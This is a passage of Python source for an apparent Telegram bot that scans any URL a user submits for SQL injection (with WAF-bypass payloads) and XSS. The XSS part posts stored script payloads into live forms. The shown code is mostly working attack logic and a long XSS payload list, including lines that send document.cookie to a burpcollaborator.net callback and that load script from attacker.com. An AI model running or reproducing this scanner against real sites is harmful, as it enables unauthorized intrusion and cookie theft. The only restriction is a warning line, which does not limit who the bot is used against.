                    baseline = session.post(base_url,
                                            json={param: "invalid_xyz_nosql_test"},
                                            timeout=8)
                    if abs(len(r.text) - len(baseline.text)) > 100:
                        return True, str(payload)
        except Exception as _e:
            logging.debug("NoSQL error: %s", _e)
        return False, None

    # ── WAF detection ──────────────────────────────
    def _detect_waf():
        try:
            waf_probe = session.get(base_url,
                params={"id": "1' OR '1'='1"}, timeout=8)
            waf_sigs = ["cloudflare", "incapsula", "sucuri", "modsecurity",
                        "barracuda", "f5 big-ip", "imperva", "403 forbidden",
                        "access denied", "request blocked"]
            body_l = waf_probe.text.lower()
            if waf_probe.status_code in (403, 406, 501, 999) or \
               any(s in body_l for s in waf_sigs):
                return True
        except Exception:
            pass
        return False

    # ── Phase 0: WAF Detection ─────────────────────
    progress_q.append("🛡️ Phase 0: WAF detection...")
    results["waf_detected"] = _detect_waf()
    if results["waf_detected"]:
        progress_q.append("⚠️ WAF detected — switching to evasion payloads")

    payload_set = _SQLI_PAYLOADS_BASIC[:]
    if results["waf_detected"]:
        payload_set = _SQLI_WAF_BYPASS + payload_set

    # ── Phase 1: Error-based (GET parallel) ────────
    progress_q.append("🧪 Phase 1: Error-based SQLi (GET + POST)...")
    found_error = False

    def _phase1_worker(args):
        param, payload = args
        return param, payload, *_test_error_get(param, payload)

    param_payload_pairs = [
        (p, pl)
        for p in list(params.keys())[:6]
        for pl in payload_set[:12]
    ]
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        for param, payload, db_type, pattern in ex.map(_phase1_worker, param_payload_pairs):
            if db_type and not found_error:
                results["error_based"].append({
                    "param": param, "payload": payload,
                    "db_type": db_type, "pattern": pattern, "method": "GET"
                })
                results["db_type"] = db_type
                found_error = True
                progress_q.append(f"🔴 Error SQLi! Param: `{param}` | DB: `{db_type}` | GET")

    # Phase 1b: POST body testing
    if not found_error:
        progress_q.append("🧪 Phase 1b: POST body injection testing...")
        for param in list(params.keys())[:4]:
            for payload in payload_set[:10]:
                db_type, pattern = _test_error_post(param, payload)
                if db_type:
                    results["post_based"].append({
                        "param": param, "payload": payload,
                        "db_type": db_type, "method": "POST"
                    })
                    results["db_type"] = db_type
                    found_error = True
                    progress_q.append(f"🔴 POST SQLi! Param: `{param}` | DB: `{db_type}`")
                    break
            if found_error:
                break

    # ── Phase 1c: Header injection ─────────────────
    progress_q.append("🧪 Phase 1c: HTTP header injection testing...")
    for header in _SQLI_HEADERS_TO_TEST[:5]:
        for payload in ["' OR '1'='1'--", "1' AND SLEEP(0)--", "' OR 1=1#"]:
            db_type, pattern = _test_header_injection(header, payload)
            if db_type:
                results["header_based"].append({
                    "header": header, "payload": payload,
                    "db_type": db_type
                })
                results["db_type"] = db_type
                progress_q.append(f"🔴 Header SQLi! Header: `{header}` | DB: `{db_type}`")
                break

    # ── Phase 2: Boolean-based ─────────────────────
    progress_q.append("🧪 Phase 2: Boolean-based SQLi testing...")
    bool_pairs = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1",     "1 AND 1=2"),
        ("1' AND 1=1--",  "1' AND 1=2--"),
        ("1' AND 1=(SELECT 1)--", "1' AND 1=(SELECT 2)--"),
    ]
    for param in list(params.keys())[:5]:
        for true_p, false_p in bool_pairs:
            detected, diff = _test_boolean(param, true_p, false_p)
            if detected:
                results["boolean_based"].append({
                    "param": param, "content_diff": diff,
                    "true_payload": true_p, "false_payload": false_p
                })
                progress_q.append(f"🟠 Boolean SQLi! Param: `{param}` | Diff: `{diff}` bytes")
                break

    # ── Phase 3: Time-based blind ──────────────────
    progress_q.append("🧪 Phase 3: Time-based blind SQLi testing...")
    _baseline_cache: dict = {}

    def _get_baseline(param):
        if param not in _baseline_cache:
            times = []
            for _ in range(2):
                t0 = time.time()
                try:
                    session.get(base_url, params=dict(params), timeout=10)
                except Exception:
                    pass
                times.append(time.time() - t0)
            _baseline_cache[param] = sum(times) / max(len(times), 1)
        return _baseline_cache[param]

    time_found_params = set()
    for param in list(params.keys())[:3]:
        if param in time_found_params:
            break
        for payload, delay in _SQLI_PAYLOADS_BLIND:
            if not delay:
                continue
            baseline_avg = _get_baseline(param)
            try:
                test_params = dict(params)
                test_params[param] = payload
                t0 = time.time()
                session.get(base_url, params=test_params, timeout=delay + 8)
                elapsed = time.time() - t0
                if elapsed - baseline_avg >= (delay * 0.8):
                    t1 = time.time()
                    session.get(base_url, params=test_params, timeout=delay + 8)
                    elapsed2 = time.time() - t1
                    if (elapsed2 - baseline_avg) >= (delay * 0.7):
                        avg_elapsed = round((elapsed + elapsed2) / 2, 2)
                        results["time_based"].append({
                            "param": param, "payload": payload,
                            "elapsed_sec": avg_elapsed, "expected_sec": delay
                        })
                        progress_q.append(
                            f"🔴 Time SQLi! Param: `{param}` | Delay: `{avg_elapsed:.1f}s`")
                        time_found_params.add(param)
                        break
            except requests.Timeout:
                results["time_based"].append({
                    "param": param, "payload": payload,
                    "elapsed_sec": delay, "expected_sec": delay
                })
                progress_q.append(
                    f"🔴 Time SQLi (Timeout)! Param: `{param}` | Delay: `{delay}s`")
                time_found_params.add(param)
                break
            except Exception:
                pass

    # ── Phase 4: NoSQL injection ───────────────────
    progress_q.append("🧪 Phase 4: NoSQL injection testing...")
    for param in list(params.keys())[:3]:
        found, payload = _test_nosql(param)
        if found:
            results["nosql_based"].append({"param": param, "payload": payload})
            progress_q.append(f"🔴 NoSQL injection! Param: `{param}`")
            break

    results["total_found"] = (
        len(results["error_based"]) + len(results["boolean_based"]) +
        len(results["time_based"]) + len(results["post_based"]) +
        len(results["header_based"]) + len(results["nosql_based"])
    )
    return results


async def cmd_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sqli <url> — SQL Injection vulnerability tester"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id

    # ✅ Bug #1 Fix: args မရှိရင် usage ပြပြီး return — rate limit မကောက်ဘဲ
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/sqli https://example.com/page?id=1`\n\n"
            "🧪 *Tests 6 SQLi types:*\n"
            "  ① Error-based GET — DB error messages\n"
            "  ② POST body injection — form + JSON\n"
            "  ③ HTTP header injection — User-Agent, Referer, X-Forwarded-For\n"
            "  ④ Boolean-based — Content length diff (difflib)\n"
            "  ⑤ Time-based blind — SLEEP/WAITFOR/pg\\_sleep\n"
            "  ⑥ NoSQL injection — MongoDB `$gt`/`$ne`/`$regex`\n\n"
            "🛡️ *WAF bypass payloads auto-enabled if WAF detected*\n"
            "🗄 *Detects:* MySQL, PostgreSQL, MSSQL, Oracle, SQLite, DB2, NoSQL\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    # Rate limit — valid URL arg ရှိမှသာ စစ်
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "SQLi scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"💉 *SQLi Test — `{domain}`*\n\n"
        "Phase 1: Error-based...\nPhase 2: Boolean...\nPhase 3: Time-based...\n⏳",
        parse_mode='Markdown'
    )

    # Track scan in DB
    async with db_lock:
        _db = _load_db_sync()
        track_scan(_db, uid, "SQLi", domain)
        _save_db_sync(_db)
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(f"💉 *SQLi — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_sqli_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        _active_scans.pop(uid, None)
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    severity = "🔴 CRITICAL" if total > 0 else "✅ Not Detected"
    waf_flag = " ⚠️ WAF" if data.get("waf_detected") else ""
    lines = [
        f"💉 *SQL Injection — `{domain}`*{waf_flag}",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"Result: {severity}",
        f"Total vulnerabilities: `{total}`",
        f"Params tested: `{'`, `'.join(data['params_tested'][:8])}`",
    ]
    if data["db_type"] != "Unknown":
        lines.append(f"🗄 Database: `{data['db_type']}`")
    lines.append("")

    if data["error_based"]:
        lines.append(f"*🔴 Error-Based SQLi (GET) — {len(data['error_based'])}:*")
        for e in data["error_based"][:3]:
            lines.append(f"  Param: `{e['param']}` | DB: `{e['db_type']}`")
            lines.append(f"  Payload: `{e['payload'][:40]}`")

    if data.get("post_based"):
        lines.append(f"\n*🔴 POST Body SQLi — {len(data['post_based'])}:*")
        for e in data["post_based"][:3]:
            lines.append(f"  Param: `{e['param']}` | DB: `{e['db_type']}` | {e['method']}")

    if data.get("header_based"):
        lines.append(f"\n*🔴 HTTP Header Injection — {len(data['header_based'])}:*")
        for e in data["header_based"][:3]:
            lines.append(f"  Header: `{e['header']}` | DB: `{e['db_type']}`")
            lines.append(f"  Payload: `{e['payload'][:40]}`")

    if data["boolean_based"]:
        lines.append(f"\n*🟠 Boolean-Based SQLi — {len(data['boolean_based'])}:*")
        for b in data["boolean_based"][:3]:
            lines.append(f"  Param: `{b['param']}` | Diff: `{b['content_diff']}` bytes")

    if data["time_based"]:
        lines.append(f"\n*🔴 Time-Based Blind SQLi — {len(data['time_based'])}:*")
        for t in data["time_based"][:3]:
            lines.append(f"  Param: `{t['param']}` | Delay: `{t['elapsed_sec']}s`")
            lines.append(f"  Payload: `{t['payload'][:45]}`")

    if data.get("nosql_based"):
        lines.append(f"\n*🟣 NoSQL Injection — {len(data['nosql_based'])}:*")
        for n in data["nosql_based"][:3]:
            lines.append(f"  Param: `{n['param']}` | Payload: `{str(n['payload'])[:40]}`")

    if total == 0:
        lines.append("✅ No SQL injection vulnerabilities detected\n_Basic inputs tested — manual testing recommended_")

    if data.get("_no_params_in_url"):
        lines.append(
            "\n⚠️ _URL တွင် query params မပါသောကြောင့် common params ဖြင့် test လုပ်သည်_\n"
            "_False positives ဖြစ်နိုင်သည် — `?id=1` ကဲ့သို့ param ပါ URL သုံးပါ_"
        )

    lines.append("\n⚠️ _Authorized testing only. Do not use on sites you don't own._")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# ③ /xss — XSS Vulnerability Scanner
# ══════════════════════════════════════════════════

_XSS_PAYLOADS = [
    # ── Basic script injection ────────────────────
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1);//<</script>",
    "</script><script>alert(1)</script>",
    "<script src=//attacker.com/x.js></script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    # ── Image/src onerror ─────────────────────────
    "<img src=x onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<img src=x onerror=alert(document.domain)>",
    "<img/src=x onerror=alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<img src=x onerror=confirm(1)>",
    "<img src=x onerror=prompt(1)>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # ── SVG ───────────────────────────────────────
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)//",
    "<svg><script>alert(1)</script></svg>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
    # ── Attribute break-out ───────────────────────
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "' onmouseover=alert(1) '",
    "\" onmouseover=alert(1) \"",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
    # ── Event handlers ────────────────────────────
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onhashchange=alert(1)><a href=#>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<iframe onload=alert(1) src=x>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<details open ontoggle=alert(1)>",
    "<details ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>xss</div>",
    "<a href=javascript:alert(1)>click</a>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<button onclick=alert(1)>click</button>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<object data=javascript:alert(1)>",
    "<math><mtext></table><img src=x onerror=alert(1)>",
    "<table><td background=javascript:alert(1)>",
    "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
    "<isindex action=javascript:alert(1) type=submit>",
    "<isindex type=image src=1 onerror=alert(1)>",
    # ── JS protocol + encoding ────────────────────
    "javascript:alert(1)",
    "javascript:alert`1`",
    "javascript:void(0)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # ── URL encoded ───────────────────────────────
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # ── Hex/unicode encoded ───────────────────────
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # ── Template literal / backtick ───────────────
    "<script>alert`1`</script>",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "`-alert(1)-`",
    # ── Framework SSTI / template injection ───────
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    "{% debug %}",
    "<%= alert(1) %>",
    "${7*7}",
    "{{7*7}}",
    # ── Filter/WAF bypass variants ────────────────
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<IMG SRC=\"jav&#x0A;ascript:alert(1);\">",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<SC\x00RIPT>alert(1)</SC\x00RIPT>",
    # ── Mutation XSS ──────────────────────────────
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<p id=</p><img src=1 onerror=alert(1)>",
    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
    # ── DOM XSS triggers ──────────────────────────
    "#<script>alert(1)</script>",
    "#\"><img src=x onerror=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    # ── Out-of-band / callback ────────────────────
    "<script>new Image().src='//x.burpcollaborator.net/?c='+document.cookie</script>",
    "<script>fetch('//x.burpcollaborator.net/?c='+document.cookie)</script>",
    # ── V24: Additional evasion / modern vectors ──
    # CSS injection
    "<style>@import'//x.example.com/xss.css';</style>",
    "<link rel=stylesheet href=//x.example.com/xss.css>",
    # window name
    "<script>alert(window.name)</script>",
    # noVAlidation — HTML5
    "<form><button formaction=javascript:alert(1)>",
    "<button formaction=javascript:alert(1) type=submit>xss</button>",
    # contenteditable
    "<p contenteditable onblur=alert(1) autofocus>click away</p>",
    "<div contenteditable onfocus=alert(1) tabindex=0>",
    # Dialog tag
    "<dialog open onclose=alert(1)></dialog>",
    # picture/source
    "<picture><source srcset='x' type='image/webp' onerror=alert(1)>",
    # Custom elements
    "<custom-element onconnect=alert(1)>",
    # Srcdoc with encoding
    "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>",
    # Case variation + tab
    "<IMG\x09SRC=x ONERROR=alert(1)>",
    "<IMG\x0dSRC=x ONERROR=alert(1)>",
    "<IMG\x0aSRC=x ONERROR=alert(1)>",
    # Closing tag bypass
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    # JSON context
    "\";alert(1);//",
    "\\\"};alert(1);//",
    "';alert(1);//",
    # Expression language
    "${alert(1)}",
    "{{constructor['constructor']('alert(1)')()}}",
    # Prototype pollution XSS
    "?__proto__[innerHTML]=<img src=1 onerror=alert(1)>",
    "?constructor[prototype][innerHTML]=<img src=1 onerror=alert(1)>",
    # CDATA
    "<![CDATA[<script>alert(1)</script>]]>",
    # AngularJS
    "{{$on.constructor('alert(1)')()}}",
    "{{['constructor']['constructor']('alert(1)')()}}",
    # React dangerouslySetInnerHTML
    "{dangerouslySetInnerHTML: {__html: '<script>alert(1)</script>'}}",
    # Script gadgets
    "<script src=\"data:text/javascript,alert(1)\">",
    "<base href=\"javascript://\"><a href=\"/alert(1)\">click</a>",
    # Polyglot
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
]

_XSS_REFLECTION_SINKS = [
    r'<script[^>]*>.*alert\(', r'onerror\s*=\s*["\']?alert\(',
    r'onload\s*=\s*["\']?alert\(', r'javascript:alert\(',
    r'<img[^>]*onerror', r'<svg[^>]*onload',
    r'onfocus\s*=\s*["\']?alert\(', r'onclick\s*=\s*["\']?alert\(',
    r'onmouseover\s*=\s*["\']?alert\(',r'<iframe[^>]*onerror',
    r'<details[^>]*ontoggle', r'alert\`1\`',
    r'<svg[^>]*onbegin', r'<input[^>]*onfocus',
    r'<body[^>]*onload', r'<div[^>]*onmouseover',
]

def _xss_scan_sync(url: str, progress_q: list) -> dict:
    """XSS scanner — reflected + DOM + form POST + header reflection + CSP analysis."""
    results = {
        "reflected":    [],
        "dom_sinks":    [],
        "form_based":   [],
        "stored":       [],
        "header_xss":   [],
        "forms_found":  0,
        "params_tested": [],
        "total_found":  0,
        "csp_present":  False,
        "csp_bypassable": False,
    }

    parsed = urlparse(url)
    params_raw = parsed.query
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    params = {}
    if params_raw:
        for part in params_raw.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                params[k] = v

    # ── Fetch page, find forms and DOM sinks ───────
    soup = None
    csp_value = ""
    try:
        resp = session.get(url, timeout=12)
        soup = BeautifulSoup(resp.text, _BS_PARSER)
        csp_value = resp.headers.get("Content-Security-Policy", "")
        results["csp_present"] = bool(csp_value)

        # CSP bypass analysis
        if csp_value:
            bypass_hints = ["unsafe-inline", "unsafe-eval", "data:", "*", "blob:"]
            if any(h in csp_value.lower() for h in bypass_hints):
                results["csp_bypassable"] = True

        # Extract ALL form fields
        for form in soup.find_all("form"):
            results["forms_found"] += 1
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name") or inp.get("id", "")
                if name and name not in params:
                    params[name] = "test"

        # DOM sink analysis — only if user-controlled source present
        user_sources = [
            r'location\.search', r'location\.hash', r'location\.href',
            r'document\.URL', r'document\.referrer', r'window\.name',
            r'document\.cookie', r'URLSearchParams', r'location\.pathname',
            r'getParameterByName', r'getUrlParam',
        ]
        dangerous_sinks = [
            (r'document\.write\s*\(',    "document.write() + user input"),
            (r'innerHTML\s*=',           "innerHTML + user input"),
            (r'outerHTML\s*=',           "outerHTML + user input"),
            (r'eval\s*\(',               "eval() + user input"),
            (r'setTimeout\s*\(\s*[^,]+location', "setTimeout with location"),
            (r'\$\s*\(\s*["\'].*location', "jQuery selector + location"),
            (r'\.html\s*\(\s*.*location', "jQuery .html() + location"),
            (r'insertAdjacentHTML',       "insertAdjacentHTML + user input"),
        ]
        for script_text in [s.string for s in soup.find_all("script") if s.string]:
            has_user_source = any(re.search(src, script_text, re.I) for src in user_sources)
            if not has_user_source:
                continue
            for pat, desc in dangerous_sinks:
                if re.search(pat, script_text, re.I) and desc not in results["dom_sinks"]:
                    results["dom_sinks"].append(desc)
    except Exception as _e:
        logging.debug("XSS fetch error: %s", _e)

    if not params:
        common_params = ["q", "search", "name", "id", "page", "url", "redirect",
                         "message", "comment", "title", "text", "s", "input", "data"]
        params = {p: "test" for p in common_params[:6]}

    results["params_tested"] = list(params.keys())
    progress_q.append(f"🔍 Testing `{len(params)}` params for XSS...")

    # ── Reflected XSS — parallel param testing ─────
    marker = f"XSSTEST{random.randint(10000,99999)}"

    def _test_reflected(param, payload):
        try:
            test_params = dict(params)
            test_params[param] = payload
            r = session.get(base_url, params=test_params, timeout=8)
            body = r.text
            if payload.lower() in body.lower():
                escaped_versions = [
                    payload.replace("<", "&lt;").replace(">", "&gt;"),
                    payload.replace('"', "&quot;").replace("'", "&#39;"),
                    payload.replace("<", "\\u003c").replace(">", "\\u003e"),
                ]
                is_escaped = any(ev.lower() in body.lower() for ev in escaped_versions)
                if not is_escaped:
                    sev = "HIGH" if any(x in payload.lower() for x in
                                       ("<script", "onerror", "onload", "onfocus")) else "MEDIUM"
                    return {"param": param, "payload": payload,
                            "status": r.status_code, "severity": sev, "method": "GET"}
        except Exception:
            pass
        return None

    # Test in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        pairs = [(p, pl) for p in list(params.keys())[:6] for pl in _XSS_PAYLOADS[:15]]
        found_params = set()
        for result_item in ex.map(lambda a: _test_reflected(*a), pairs):
            if result_item and result_item["param"] not in found_params:
                results["reflected"].append(result_item)
                found_params.add(result_item["param"])
                progress_q.append(f"🔴 XSS reflected! Param: `{result_item['param']}` | Sev: {result_item['severity']}")

    # ── Form-based XSS (POST) ──────────────────────
    progress_q.append("🔍 Testing form-based XSS (POST)...")
    if soup:
        for form in soup.find_all('form')[:4]:
            action = form.get('action', '')
            form_url = urljoin(url, action) if action else url
            method   = form.get('method', 'get').lower()
            form_params = {}
            for inp in form.find_all(['input', 'textarea', 'select']):
                iname = inp.get('name')
                itype = inp.get('type', 'text').lower()
                if iname:
                    if itype in ('submit', 'button'):
                        continue
                    elif itype == 'hidden':
                        form_params[iname] = inp.get('value', '')
                    else:
                        form_params[iname] = '<img src=x onerror=alert(1)>'

            if not form_params:
                continue
            safe_ok2, _ = is_safe_url(form_url)
            if not safe_ok2:
                continue
            try:
                fn = session.post if method == 'post' else session.get
                r_form = fn(form_url, data=form_params, timeout=10, allow_redirects=True)
                body = r_form.text
                # Check reflection
                if 'onerror=alert(1)' in body and '<img src=x onerror=alert(1)>' in body:
                    results["form_based"].append({
                        "form_url": form_url, "method": method.upper(),
                        "params": list(form_params.keys()), "severity": "HIGH"
                    })
                    progress_q.append(f"🔴 Form XSS! URL: `{form_url}` [{method.upper()}]")
            except Exception:
                pass

    # ── Stored XSS check ──────────────────────────
    progress_q.append("🔍 Testing Stored XSS...")
    stored_marker = f"STOREDXSS{random.randint(10000,99999)}"
    if soup:
        for form in soup.find_all('form')[:3]:
            action = form.get('action', '')
            form_url = urljoin(url, action) if action else url
            if form.get('method', 'get').lower() != 'post':
                continue
            post_data = {}
            for inp in form.find_all(['input', 'textarea']):
                iname = inp.get('name')
                itype = inp.get('type', 'text').lower()
                if iname and itype not in ('submit', 'button', 'file'):
                    if itype == 'hidden':
                        post_data[iname] = inp.get('value', '')
                    else:
                        post_data[iname] = f'<script>alert("{stored_marker}")</script>'
            if not post_data:
                continue
            safe_ok2, _ = is_safe_url(form_url)
            if not safe_ok2:
                continue
            try:
                r_post = session.post(form_url, data=post_data, timeout=10, allow_redirects=True)
                if stored_marker in r_post.text:
                    results["stored"].append({
                        "form_url": form_url, "params": list(post_data.keys()), "severity": "HIGH"
                    })
                    progress_q.append(f"🔴 Stored XSS candidate! Form: `{form_url}`")
            except Exception:
                pass

    # ── Header-based XSS (Referer / X-Forwarded-For) ──
    progress_q.append("🔍 Testing header-based XSS reflection...")
    for header_name in ["Referer", "X-Forwarded-For", "User-Agent"]:
        payload = '<img src=x onerror=alert(1)>'
        try:
            inj_headers = dict(_get_headers())
            inj_headers[header_name] = payload
            r_hdr = session.get(base_url, headers=inj_headers, timeout=8)
            if payload.lower() in r_hdr.text.lower():
                results["header_xss"].append({"header": header_name, "payload": payload})
                progress_q.append(f"🔴 Header XSS! `{header_name}` reflected")
        except Exception:
            pass

    results["total_found"] = (
        len(results["reflected"]) + len(results["dom_sinks"]) +
        len(results["form_based"]) + len(results.get("stored", [])) +
        len(results["header_xss"])
    )
    return results


async def cmd_xss(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/xss <url> — XSS vulnerability scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/xss https://example.com/search?q=test`\n\n"
            "🧪 *Tests:*\n"
            "  ① Reflected XSS — URL params\n"
            "  ② DOM-based XSS — JS source analysis\n"
            "  ③ Form input fields\n"
            f"  {len(_XSS_PAYLOADS)} payloads including polyglots\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "XSS scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🎯 *XSS Scanner — `{domain}`*\n\n"
        "① Reflected XSS testing...\n② DOM sink analysis...\n⏳",
        parse_mode='Markdown'
    )

    # Track scan in DB
    async with db_lock:
        _db = _load_db_sync()
        track_scan(_db, uid, "XSS", domain)
        _save_db_sync(_db)
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(f"🎯 *XSS — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_xss_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        _active_scans.pop(uid, None)
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    severity = "🔴 VULNERABLE" if total > 0 else "✅ Not Detected"
    csp_status = "✅ Present" if data['csp_present'] else "❌ Missing"
    if data['csp_present'] and data.get('csp_bypassable'):
        csp_status = "⚠️ Present but bypassable (unsafe-inline/eval)"
    lines = [
        f"🎯 *XSS Scan — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"Result: {severity}",
        f"Forms found: `{data['forms_found']}`",
        f"Params tested: `{'`, `'.join(data['params_tested'][:8])}`",
        f"CSP: {csp_status}",
        "",
    ]

    if data["reflected"]:
        lines.append(f"*🔴 Reflected XSS (GET) — {len(data['reflected'])}:*")
        for r in data["reflected"][:5]:
            sev_icon = "🔴" if r["severity"] == "HIGH" else "🟠"
            lines.append(f"  {sev_icon} Param: `{r['param']}` | {r['severity']}")
            lines.append(f"     Payload: `{r['payload'][:50]}`")

    if data.get("form_based"):
        lines.append(f"\n*🔴 Form-Based XSS (POST) — {len(data['form_based'])}:*")
        for f in data["form_based"][:3]:
            lines.append(f"  🔴 URL: `{f['form_url'][:60]}` [{f['method']}]")
